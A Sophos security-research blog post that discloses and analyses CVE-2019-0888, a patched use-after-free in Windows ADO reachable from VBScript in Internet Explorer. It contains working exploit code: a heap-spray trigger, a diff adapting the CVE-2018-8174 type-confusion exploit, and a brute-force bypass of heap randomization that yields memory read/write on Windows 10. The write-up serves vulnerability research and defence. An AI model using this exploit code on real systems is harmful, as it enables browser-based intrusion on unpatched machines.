						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
					<img width="170" height="171" src="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?w=170" class="object-cover wp-post-image" alt="" srcset="https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg 170w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=150,150 150w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=32,32 32w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=50,50 50w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=64,64 64w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=96,96 96w, https://news.sophos.com/wp-content/uploads/2013/04/windows7-patch-1701.jpg?resize=128,128 128w" sizes="(max-width: 170px) 100vw, 170px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2022/07/Category-Icon-X-Ops-v2.png"
							alt="Threat Research"
					/>
														</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)</h1>
									<div class="text-xl md:text-2xl -mt-2 mb-6">
						Details of the vulnerability we reported to Microsoft and was fixed in last month&#039;s Patch Tuesday					</div>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/7u7bdp6d/" title="Posts by SophosLabs Offensive Security" class="author url fn" rel="author">SophosLabs Offensive Security</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2019/07/09/cve-2019-0888-use-after-free-in-windows-activex-data-objects-ado/" rel="bookmark">July 09, 2019</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/threat-research/sophoslabs-uncut/" class="category-tag-pill">SophosLabs Uncut</a> <a href="https://news.sophos.com/en-us/tag/ado/" class="category-tag-pill">ADO</a> <a href="https://news.sophos.com/en-us/tag/cve-2019-0888/" class="category-tag-pill">CVE-2019-0888</a> <a href="https://news.sophos.com/en-us/tag/exploit/" class="category-tag-pill">Exploit</a> <a href="https://news.sophos.com/en-us/tag/use-after-free/" class="category-tag-pill">use-after-free</a> <a href="https://news.sophos.com/en-us/tag/vbscript/" class="category-tag-pill">VBscript</a> <a href="https://news.sophos.com/en-us/tag/vulnerability/" class="category-tag-pill">vulnerability</a> <a href="https://news.sophos.com/en-us/tag/windows/" class="category-tag-pill">Windows</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		
<p>The SophosLabs Offensive Security Research team discovered a security vulnerability in the <a href="https://docs.microsoft.com/en-us/sql/ado/microsoft-activex-data-objects-ado?view=sql-server-2017">ActiveX Data Objects (ADO)</a> component of Windows. Microsoft resolved the issue in the <a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/">June 2019 edition of Patch Tuesday</a>. It has been a month since the patch was released, so we&#8217;ve decided to publish the following explanation of the bug, and how to exploit it to achieve an ASLR bypass and Read/Write primitive.</p>
<p>The article references symbols and types from the 32-bit <strong>vbscript.dll</strong> file, version 5.812.10240.16384, from Windows 10.</p>



<h2>Background</h2>



<p>ADO is an API to access and manipulate data through an OLE database provider. In our examples to follow, the OLE DB provider is a Microsoft SQL server. Different programs, using a variety of languages, can use this API.</p>
<p>In the scope of this article, we will make use of ADO from VBScript code running in Internet Explorer, and connect to a <a href="https://www.microsoft.com/en-ca/download/details.aspx?id=42299">Microsoft SQL Server 2014 Express</a> instance running locally.</p>

<h6 id="usage-poc"> </h6>

<p>Here&#8217;s an example of a basic VBScript script that establishes a connection to the local database (named <em>SQLEXPRESS</em>) by using an <a href="https://docs.microsoft.com/en-us/sql/ado/reference/ado-api/recordset-object-ado?view=sql-server-2017">ADO Recordset object</a>:</p>


<pre class="brush: vb; title: ; notranslate" title="">
On Error Resume Next

Set RS = CreateObject(&quot;ADOR.Recordset&quot;)

RS.Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
                &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
                &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
                &quot;Initial Catalog=master;&quot; &amp;amp; _
                &quot;Integrated Security=SSPI;&quot; &amp;amp; _
                &quot;Trusted_Connection=True;&quot;

If Err.Number &lt;&amp;gt; 0 Then
        MsgBox(&quot;DB open error&quot;)
Else
        MsgBox(&quot;DB opened&quot;)
End If
</pre>


<p>Establishing a connection using ADO from Internet Explorer prompts this security warning, which makes the bug inconvenient to exploit unobtrusively.</p>



<div class="wp-block-image">
<figure class="aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png"><img loading="lazy" width="495" height="181" class="wp-image-57693" src="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png" alt="" srcset="https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png 495w, https://news.sophos.com/wp-content/uploads/2019/05/ado_security_warning.png?resize=300,110 300w" sizes="(max-width: 495px) 100vw, 495px" /></a></figure>
<p>&nbsp;</p>
</div>
<p><span id="more-57686"></span></p>



<h2>The Bug</h2>



<p>The <code>Recordset</code> Object method <code>NextRecordset</code> improperly handles its <code>RecordsAffected</code> parameter.</p>
<p>When an application calls this method with an Object-typed variable passed to it as the <code>RecordsAffected</code> parameter, the method will leave that object&#8217;s reference count decreased by 1, while keeping the variable referenceable.</p>
<p>When the reference count drops to 0, the operating system destroys the object and deallocates its memory. However, since the object can still be referenced by its variable name, further usage of that variable will cause a <strong>Use-After-Free</strong> condition.</p>



<p>These are the important bits about <code>NextRecordset</code>&#8216;s functionality from <a href="https://docs.microsoft.com/en-us/sql/ado/reference/ado-api/nextrecordset-method-ado?view=sql-server-2017">its documentation</a>:</p>



<ul>
<li style="list-style-type:none;">
<ul>
<li><em>Use the NextRecordset method to return the results of the next command in a compound command statement or of a stored procedure that returns multiple results.</em></li>
<li><em>The NextRecordset method is not available on a disconnected Recordset object.</em></li>
<li><em>Parameters: RecordsAffected<br />Optional. A Long variable to which the provider returns the number of records that the current operation affected.</em></li>
</ul>
</li>
</ul>



<p>Simply put, the method works on a connected Recordset object, retrieves and returns some sort of database related data, and writes back a number to the provided parameter.</p>



<h6 id="com-interface"> </h6>

<p>The method is implemented in library <code>msado15.dll</code> with the function <code>CRecordset::NextRecordset</code>. This is how <code>NextRecordset</code> is defined in the library&#8217;s <a href="https://docs.microsoft.com/en-us/windows/desktop/com/defining-com-interfaces">COM interface</a>:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png"><img loading="lazy" class="alignnone wp-image-58429 size-full" src="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png" alt="" width="581" height="143" srcset="https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png 581w, https://news.sophos.com/wp-content/uploads/2019/05/nrs_idl.png?resize=300,74 300w" sizes="(max-width: 581px) 100vw, 581px" /></a></p>



<p>If the method is successful at retrieving the database-related data, it calls the internal function <code>ProcessRecordsAffected</code> to handle the assignment of the number of affected records to parameter <code>RecordsAffected</code>.</p>



<p>Inside <code>ProcessRecordsAffected</code>, the library creates a local variable, called <code>local_copy_of_RecordsAffected</code> , <a href="https://en.wikipedia.org/wiki/Object_copying#Shallow_copy" target="_blank" rel="noopener">shallow-copies</a> the <code>RecordsAffected</code> parameter into it, and then calls the <code>VariantClear</code> function:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png"><img loading="lazy" class="alignnone size-full wp-image-58433" src="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png" alt="" width="638" height="255" srcset="https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png 638w, https://news.sophos.com/wp-content/uploads/2019/05/pra_old.png?resize=300,120 300w" sizes="(max-width: 638px) 100vw, 638px" /></a></p>



<p><code>VariantClear</code> is described <a href="https://docs.microsoft.com/en-us/windows/desktop/api/oleauto/nf-oleauto-variantclear">here</a>. To quote:</p>
<p style="padding-left:40px;">&#8220;<em>The function clears a VARIANTARG by setting the vt field to VT_EMPTY.</em>&#8220;<br />&#8220;<em>The current contents of the VARIANTARG are released first. [&#8230;] If the vt field is VT_DISPATCH, the object is released</em>.&#8221;</p>



<p>VBScript object variables are, essentially, wrapped ActiveX objects, implemented in C++. They are created by the function <a href="https://www.w3schools.com/asp/func_createobject.asp">CreateObject</a>, e.g. variable <code>RS</code> in the <a href="#usage-poc">above code sample</a>.</p>
<p>VBScript objects are represented internally as <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/variant-data-type">Variant</a> structures of the type VT_DISPATCH. Therefore, in this case, the call to <code>VariantClear</code> will set <code>local_copy_of_RecordsAffected</code>&#8216;s type to VT_EMPTY, and perform a &#8220;release&#8221; on it, meaning it will invoke its underlying C++ object&#8217;s <a href="https://docs.microsoft.com/en-us/windows/desktop/api/unknwn/nf-unknwn-iunknown-release">::Release</a> method, which decrements the object&#8217;s reference count by 1 (and destroys the object if the reference count reaches 0).</p>



<p>After the <code>VariantClear</code> call, the function continues as follows:</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/vct.png"><img loading="lazy" class="alignnone size-full wp-image-58434" src="https://news.sophos.com/wp-content/uploads/2019/05/vct.png" alt="" width="640" height="344" srcset="https://news.sophos.com/wp-content/uploads/2019/05/vct.png 640w, https://news.sophos.com/wp-content/uploads/2019/05/vct.png?resize=300,161 300w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>



<p>This function converts the 64-bit integer variable, <code>RecordsAffectedNum,</code>  into a signed 32-bit integer (referred to here as <em>type VT_I4</em>), and passes that value to <a href="https://docs.microsoft.com/en-us/windows/desktop/api/oleauto/nf-oleauto-variantchangetype">VariantChangeType</a> in an attempt to convert it to a variant of type <code>RecordsAffected_vt</code>, which is VT_DISPATCH in the vulnerable scenario.</p>
<p>No logic exists to convert a VT_I4 type into a VT_DISPATCH type, so <code>VariantChangeType</code> will always fail here, and the early return path will take place. Since <code>RecordsAffected</code> is defined with the <em><a href="https://docs.microsoft.com/en-us/windows/desktop/Midl/out-idl">out</a> </em>attribute in its <a href="#com-interface">COM interface declaration</a>, the way <code>ProcessRecordsAffected</code> handles <code>RecordsAffected</code> will have an impact on the program:</p>



<p style="padding-left:40px;">&#8220;<em>The [<strong>out</strong>] attribute indicates that a parameter that acts as a pointer and its associated data in memory are to be passed back from the called procedure to the calling procedure.</em>&#8220;</p>
<p>Simply put, <code>RecordsAffected</code> is passed back to the program after <code>NextRecordset</code> returns, either in its original state or whatever state it was modified into by <code>ProcessRecordsAffected</code>. Looking back at the execution path the function undergoes in a vulnerable scenario, we can see it reaches the return statement without ever directly modifying <code>RecordsAffected</code>.</p>
<p><code>VariantClear</code> is called on <strong>a copy</strong> of <code>RecordsAffected</code>, so it triggers a release of the copy&#8217;s underlying C++ object, and changes the copy&#8217;s type to VT_EMPTY.</p>
<p>Since the copying was done in a <em>shallow</em> way, both <code>RecordsAffected</code> and its copy contain the same pointer to the underlying C++ object; A release of one of the variables is equivalent to a release of the second. However, changing the copy&#8217;s type to VT_EMPTY will have no effect on <code>RecordsAffected</code> &#8211; its type will remain intact.</p>
<p>Since <code>RecordsAffected</code>&#8216;s type has not been emptied, it will be passed back to the program and remain referenceable, despite its underlying C++ object being released and, potentially, deallocated.</p>
<p>Considering how the bug is seemingly triggered on every call to the method, how does it manage to complete a legitimate call without crashing?</p>
<p>Looking back at the documentation, it specifies that <code>RecordsAffected</code> is supposed to be of type <em>Long</em> (a variant of type VT_I4). <code>VariantClear</code> does not have the same destructive effect on VT_I4 variants as it does on VT_DISPATCH variants (releasing its object). Therefore, as long as calls to the method use a <code>RecordsAffected</code> that fits the intended type, there will be no negative side effects to the program.</p>







<h2>Fix</h2>



<p>The bug was fixed in Microsoft&#8217;s <a href="https://news.sophos.com/en-us/2019/06/11/patch-tuesday-squashes-89-bugs-including-a-sophoslabs-find/">June 2019 edition of Patch Tuesday</a>, and was assigned <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0888">CVE-2019-0888</a>.</p>



<p>The function <code>ProcessRecordsAffected</code> was patched to omit the local variable <code>local_copy_of_RecordsAffected</code>, instead operating directly on <code>RecordsAffected</code>, correctly emptying its type and preventing it from being passed back to the program.</p>



<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png"><img loading="lazy" class="alignnone size-full wp-image-58436" src="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png" alt="" width="637" height="182" srcset="https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png 637w, https://news.sophos.com/wp-content/uploads/2019/05/pra_new.png?resize=300,86 300w" sizes="(max-width: 637px) 100vw, 637px" /></a></p>



<h2>&#8220;Dumb&#8221; Exploitation</h2>



<p>The simplest way to achieve some type of exploit primitive with this bug would be to cause an object to be freed, and then immediately spray the heap with controlled-data memory allocations of the same size as the freed object, so that the memory that used to hold the object now holds our own arbitrary data.</p>


<pre class="brush: vb; title: ; notranslate" title="">
On Error Resume Next

Set RS = CreateObject(&quot;ADOR.Recordset&quot;)
Set freed_object = CreateObject(&quot;ADOR.Recordset&quot;)

' Open Recordset connection to database
RS.Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
                &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
                &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
                &quot;Initial Catalog=master;&quot; &amp;amp; _
                &quot;Integrated Security=SSPI;&quot; &amp;amp; _
                &quot;Trusted_Connection=True;&quot;

' Connection objects to be used for heap spray later
Dim array(1000)
For i = 0 To 1000
        Set array(i) = CreateObject(&quot;ADODB.Connection&quot;)
Next

' Data to spray in heap: allocation size will be 0x418
' (size of CRecordset in 32-bit msado15.dll)
spray = ChrW(&amp;amp;h4141) &amp;amp; ChrW(&amp;amp;h4141) &amp;amp; _
        ChrW(&amp;amp;h4141) &amp;amp; ChrW(&amp;amp;h4141) &amp;amp; _
        Space(519)

' Trigger bug
Set Var1 = RS.NextRecordset(freed_object)

' Perform heap spray
For i = 0 To 1000
        array(i).ConnectionString = spray
Next

' Trigger use after free
freed_object.Clone()
</pre>


<p>Line 4 creates a new VBScript object <code>freed_object</code>, with an underlying C++ object of type <code>CRecordset</code>, a 0x418-byte-sized structure.</p>



<p>Line 27 decreases <code>freed_object</code>&#8216;s underlying C++ object&#8217;s reference count to 0, and should cause the deallocation of its internal resources.</p>



<p>Line 31 uses the <code>ConnectionString</code> property of the <code>ADODB.Connection</code> class to spray the heap. When a string is assigned into <code>ConnectionString</code> it creates a local copy, allocating a memory chunk with the same size as the assigned string, and copying its contents into it. The <code>spray</code> string is crafted to result in a 0x418-byte allocation.</p>



<p>Line 35 dereferences <code>freed_object</code>. At this point, any referencing of this variable will invoke a dynamic dispatch on the underlying C++ object, meaning its virtual table pointer will be dereferenced, and a function pointer will be loaded from that memory. Since the virtual table pointer is located at offset 0 of a C++ object, the value that will be loaded, and later cause a memory access violation exception in the first 4 bytes of <code>spray</code>, 0x41414141.</p>



<p>To make this primitive useful for actual exploitation, we would need to rely on knowing a readable, controllable memory address in the program&#8217;s address space &#8211; a feat that is rendered impossible by ASLR. A better approach will have to be used to defeat mitigations like ASLR to exploit this bug on modern systems.</p>



<h2>Advanced Exploitation</h2>



<p>While looking for existing research on exploitation methods for similar VBScript bugs that can be of help here, we came across <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8174">CVE-2018-8174</a>. Dubbed the &#8220;Double Kill&#8221; exploit, it was <a href="https://blog.360totalsecurity.com/en/analysis-cve-2018-8174-vbscript-0day-apt-actor-related-office-targeted-attack/">detected in the wild</a> by security company Qihoo 360 around May 2018. Plenty of articles have been written about dissecting the captured exploit and underlying bug, so for further details we will refer to these:</p>



<p style="padding-left:40px;">[1] <a href="http://blogs.360.cn/post/cve-2018-8174-en.html" target="_blank" rel="noopener">Analysis of CVE-2018-8174 VBScript 0day</a>, 360 Qihoo</p>
<p style="padding-left:40px;">[2] <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">Delving deep into VBScript: Analysis of CVE-2018-8174 exploitation</a>, Kaspersky Lab</p>
<p style="padding-left:40px;">[3] <a href="https://medium.com/@florek/dissecting-modern-browser-exploit-case-study-of-cve-2018-8174-1a6046729890" target="_blank" rel="noopener">Dissecting modern browser exploit: case study of CVE-2018–8174</a>, <a href="https://github.com/piotrflorczyk" target="_blank" rel="noopener">piotrflorczyk</a></p>



<p>CVE-2018-8174 is a use-after-free bug in VBScript around the handling of the <code>Class_Terminate</code> callback function. Essentially, it gave the ability to arbitrarily free a VBScript object but keep it referenceable, similar to the ADO bug&#8217;s properties.</p>



<p>The captured exploit implemented a sophisticated technique that employs a type confusion attack to turn the use-after-free capability into an ASLR bypass and read-write-everywhere primitive. The technique itself isn&#8217;t useful on its own (without a bug to enable it), and is technically not a bug, so it was never &#8220;fixed,&#8221; and remains present in the code base. The technique is probably best explained in <a href="https://medium.com/@florek/dissecting-modern-browser-exploit-case-study-of-cve-2018-8174-1a6046729890" target="_blank" rel="noopener">the article by Piotr Florczyk</a>.</p>



<p>Given the similarities between the 2 bugs, it should be possible to take the <a href="https://github.com/piotrflorczyk/cve-2018-8174_analysis/blob/master/analysis.vbs">commented exploit code for CVE-2018-8174</a> from Florczyk&#8217;s writeup, replace the bug-specific code parts to make use of the ADO bug, and have it successfully work the same way. And, indeed, applying this simple patch&#8230;</p>


<pre class="brush: diff; title: ; notranslate" title="">
diff --git a/analysis_base.vbs b/analysis_modified.vbs
index 6c1cd3f..fd25809 100644
--- a/analysis_base.vbs
+++ b/analysis_modified.vbs
@@ -1,3 +1,14 @@
+Dim RS(13)
+For i = 0 to UBound(RS)
+    Set RS(i) = CreateObject(&quot;ADOR.Recordset&quot;)
+    RS(i).Open &quot;SELECT * FROM INFORMATION_SCHEMA.COLUMNS&quot;, _
+        &quot;Provider=SQLOLEDB;&quot; &amp;amp; _
+        &quot;Data Source=.\SQLEXPRESS;&quot; &amp;amp; _
+        &quot;Initial Catalog=master;&quot; &amp;amp; _
+        &quot;Integrated Security=SSPI;&quot; &amp;amp; _
+        &quot;Trusted_Connection=True;&quot;
+Next
+
 Dim FreedObjectArray
 Dim UafArrayA(6),UafArrayB(6)
 Dim UafCounter
@@ -101,7 +112,8 @@ Public Default Property Get Q
     Dim objectImitatingArray
     Q=CDbl(&quot;174088534690791e-324&quot;) ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
     For idx=0 To 6
-        UafArrayA(idx)=0
+        On Error Resume Next
+        Set m = RS(idx).NextRecordset(resueObjectA_arr)
     Next
     Set objectImitatingArray=New FakeReuseClass
     objectImitatingArray.mem = FakeArrayString
@@ -116,7 +128,8 @@ Public Default Property Get P
     Dim objectImitatingInteger
     P=CDbl(&quot;636598737289582e-328&quot;) ' db 0, 0, 0, 0, 3, 0, 0, 0
     For idx=0 To 6
-        UafArrayB(idx)=0
+        On Error Resume Next
+        Set m = RS(7+idx).NextRecordset(resueObjectB_int)
     Next
     Set objectImitatingInteger=New FakeReuseClass
     objectImitatingInteger.mem=Empty16BString
@@ -136,19 +149,7 @@ Sub UafTrigger
     For idx=20 To 38
         Set objectArray(idx)=New ReuseClass
     Next
-    UafCounter=0    
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateA
-        Erase FreedObjectArray
-    Next
     Set resueObjectA_arr=New ReuseClass
-    UafCounter=0
-    For idx=0 To 6
-        ReDim FreedObjectArray(1)
-        Set FreedObjectArray(1)=New ClassTerminateB
-        Erase FreedObjectArray
-    Next
     Set resueObjectB_int=New ReuseClass
 End Sub
</pre>


<p>&#8230;produces a working exploit for the ADO bug.</p>



<p>It turns out that this exploit works on systems running Windows 7, but not on Windows 8 or later versions. This is the case with the original captured exploit as well. The exploit breaks due to &#8220;Low fragmentation heap (LFH) allocation order randomization&#8221;, a security measure for the heap introduced in Windows 8 that <a href="https://www.malwaretech.com/2019/04/analysis-of-a-vb-script-heap-overflow.html" target="_blank" rel="noopener">breaks simple use-after-free exploitation</a> scenarios. </p>



<h2>Bypassing LFH Allocation Order Randomization</h2>



<p>Here&#8217;s one example of how heap behavior changed after Microsoft introduced LFH allocation order randomization:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png"><img loading="lazy" class="alignnone size-full wp-image-58437" src="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png" alt="" width="621" height="199" srcset="https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png 621w, https://news.sophos.com/wp-content/uploads/2019/05/randomization-1.png?resize=300,96 300w" sizes="(max-width: 621px) 100vw, 621px" /></a></p>



<p>Introducing allocation order randomization changed the outcome of malloc-&gt;free-&gt;malloc execution, from following a LIFO (Last In First Out) logic to being non-deterministic.</p>



<p>Why does this break the exploit? Consider the following excerpt from the commented exploit code:</p>


<pre class="brush: vb; title: ; notranslate" title="">
Class ReplacingClass_Array
Public Default Property Get Q
    ...
    For idx=0 To 6
        On Error Resume Next
        Set m = RS(idx).NextRecordset(reuseObjectA_arr)
    Next
    Set objectImitatingArray=New FakeReuseClass
    ...
</pre>


<p>In VBScript, all custom class objects are internally represented by the <code>VBScriptClass</code> C++ class. VBScript calls the function <code>VBScriptClass::Create</code>  when it executes a custom class object instantiation statement (for example, line 8). It makes a 0x44-byte-sized allocation to hold the <code>VBScriptClass</code> object.</p>



<p>When control reaches line 8, the <em>For</em> loop has just finished destroying <code>reuseObjectA_arr</code>, which is an instance of custom class <code>ReuseClass</code>. This will cause the <code>VBScriptClass</code> destructor to be called, freeing the 0x44 bytes that had been previously allocated. Line 8 then goes on to create a new object, <code>objectImitatingArray</code>, of a different custom class: <code>FakeReuseClass</code>.</p>



<p>The basis for a successful run of the type confusion attack is the assumption that <strong><code>objectImitatingArray</code> will be assigned the same heap memory resources as the just-freed <code>reuseObjectA_arr</code></strong>. However as noted before, with allocation order randomization enabled, you can&#8217;t make this assumption; the randomized heap breaks the exploit.</p>



<p>As a result of the type confusion attack, a memory corruption occurs. The heap allocation where corruption occurs is not the top-level (0x44) allocation of <code>VBScriptClass</code> itself, but a certain 0x108 bytes sized sub-allocation tied to it, used to store the object&#8217;s methods and variables. The function responsible for this sub-allocation is <code>NameList::FCreateVval</code> and is called shortly after the creation of a <code>VBScriptClass</code> (see <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">article [2]</a>).</p>



<p>To be more specific about the condition that needs to be met, the type confusion will work if, <strong>after the destruction of <code>reuseObjectA_arr</code>, a new VBScript object receives the same address for its 0x108 allocation as the one <code>reuseObjectA_arr</code> previously held</strong>. Other allocations tied to the two objects, including the 0x44 sized top-level allocation, don&#8217;t necessarily have to get matching addresses.</p>



<p>The specifics of the memory corruption part of the technique is not very straightforward to understand and it&#8217;s advised to read <a href="https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/" target="_blank" rel="noopener">the Kaspersky background article</a> to get a better understanding of it, but here&#8217;s the gist of it.</p>
<p><code>ReuseClass</code>&#8216;s method, <code>SetProp</code>, has the following statement: <em>mem=Value</em>. <code>Value</code> is an object variable, so its <a href="http://www.stealthbot.net/wiki/VBScript_class#Default_property_or_method">Default Property Getter</a> will have to be invoked <em>before</em> the assignment can be completed.</p>
<p>The VBScript engine (vbscript.dll) calls internal function <code>AssignVar</code> to perform an assignment of this kind. This is a simplified pseudo-code to explain how it works:</p>


<pre class="brush: cpp; title: ; notranslate" title="">
AssignVar(VARIANT *destinationObject, char *destinationVariableName, VARIANT *source) {
  // here, destinationObject is a ReuseClass instance, destinationVariableName is &quot;mem&quot;, source is &lt;Value&amp;gt;

  // get the address of object &lt;destinationObject&amp;gt;'s member variable with the name &lt;destinationVariableName&amp;gt;.
  VARIANT *destinationPointer = CScriptRuntime::GetVarAdr(destinationObject, destinationVariableName);

  // if the given source is an object, call the object's
  // default property getter to get the actual source value
  if (source-&amp;gt;vt == VT_IDISPATCH) {
    VARIANT *sourceValue = VAR::InvokeByDispID(source);
  }

  // perform the assignment
  *destinationPointer = *sourceValue;
}    
</pre>


<p>The function <code>VAR::InvokeByDispID</code> invokes the source object&#8217;s default property getter, allowing us to run arbitrary VBScript code in the midst of <code>AssignVar</code>&#8216;s execution. If we use that space to trigger the destruction and replacement in memory of <code>destinationObject</code> (using the bug), we can take advantage of <code>AssignVar</code> proceeding to perform the assignment into <code>destinationPointer</code> (line 14) <strong>without realizing the memory it points to could have been tampered with</strong>.</p>
<p>The memory address being written into is the value returned by <code>CScriptRuntime::GetVarAdr</code>, which is a pointer to somewhere inside the given object&#8217;s 0x108 allocation. Its exact offset into the allocation depends on the given object&#8217;s class definition &#8211; particularly, how long the names of its methods and fields are.</p>
<p><code>ReuseClass</code> and <code>FakeReuseClass</code>&#8216;s definitions are arranged in a way to force a different offset for common member variable <code>mem</code>. Doing this, we&#8217;re forcing the final assignment to corrupt an object&#8217;s <code>mem</code> variable&#8217;s <strong>header</strong> in order to turn it into an Array type whose base pointer is NULL and its length is 0x7fffffff.</p>



<p>CVE-2018-8174&#8217;s exploit uses a one-shot approach for attempting to pull off the type confusion attack, meaning that <strong>only a single new object</strong> is created after the destruction of <code>reuseObjectA_arr</code>. As we explained before, this will only reliably work on Windows systems prior to Windows 8, which lack the LFH Allocation Order Randomization feature.</p>



<p>To make this exploit work on Windows 10 systems, we can implement a <strong>brute-force approach</strong> for attempting the type confusion attack. Instead of creating a single new object, we can mass-create new objects to ensure the freed 0x108 allocation will ultimately get assigned into one of them.</p>



<p>Here&#8217;s how the code can be transformed into implementing a brute-force approach:</p>



<pre class="wp-block-preformatted wp-block-syntaxhighlighter-code brush: vb; notranslate">Set reuseObjectA_arr=New ReuseClass
...
Class ReplacingClass_Array
Public Default Property Get Q
    Dim objectImitatingArray
    
    Q=CDbl("174088534690791e-324") ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0
    
    For i=0 To 6
        DecrementRefcount(reuseObjectA_arr)
    Next

    For i=0 to UBound(UafArrayA)
        Set objectImitatingArray=New FakeReuseClass
        objectImitatingArray.mem = FakeArrayString
        For j=0 To 6
            Set UafArrayA(i,j)=objectImitatingArray
        Next
    Next
End Property
End Class</pre>



<p>Here&#8217;s a visualization of the above code&#8217;s logic in action:</p>
<!-- /wp:image -->
<figure id="attachment_58439" aria-describedby="caption-attachment-58439" style="width: 636px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png"><img loading="lazy" class="size-full wp-image-58439" src="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png" alt="" width="636" height="576" srcset="https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png 636w, https://news.sophos.com/wp-content/uploads/2019/05/ado_bruteforce-1.png?resize=300,272 300w" sizes="(max-width: 636px) 100vw, 636px" /></a><figcaption id="caption-attachment-58439" class="wp-caption-text">UafArrayA(38) receives the same 0x108 allocation (Vval) as reuseObjectA_arr</figcaption></figure>
<!-- wp:paragraph -->
<p>After the <code>UafArrayA</code> array has been mass-filled with new <code>FakeReuseClass</code> objects and the <em><code>mem=Value</code></em> assignment completes, we can iterate over the array and find the object whose <code>mem</code> variable has been successfully corrupted to become an array:</p>
<!-- /wp:paragraph -->

<!-- wp:syntaxhighlighter/code {"language":"vb"} -->
<pre class="wp-block-syntaxhighlighter-code brush: vb; notranslate">For i=0 To UBound(UafArrayA)
    Err.Clear
    a = UafArrayA(i,0).mem(Empty16BString_addr)
    If Err.Number = 0 Then
        Exit For
    End If
Next
If i &gt; UBound(UafArrayA) Then
    MsgBox("Could not find an object corrupted by reuseObjectA_arr")
Else
    MsgBox("Got UafArrayA_obj from UafArrayA(" &amp; i &amp; ")")
    Set UafArrayA_obj = UafArrayA(i,0)
End If</pre>
<!-- /wp:syntaxhighlighter/code -->

<!-- wp:paragraph -->
<p>The corrupted object will be the only one not to cause an exception to be thrown on line 3. Once we find it, it can be referenced with any index, allowing to read and write all addresses in the process memory space.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>With this fix to the original exploit, it <strong>now works on Windows 10 systems as well.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>PoC</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>You can find the proof-of-concept file on the <a href="https://github.com/sophoslabs/CVE-2019-0888">SophosLabs GitHub repository</a>.</p>
<!-- /wp:paragraph -->			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=57686&#038;title=CVE-2019-0888:%20Use-After-Free%20in%20Windows%20ActiveX%20Data%20Objects%20(ADO)"
			data-title="CVE-2019-0888: Use-After-Free in Windows ActiveX Data Objects (ADO)"
			title="Share on Facebook">
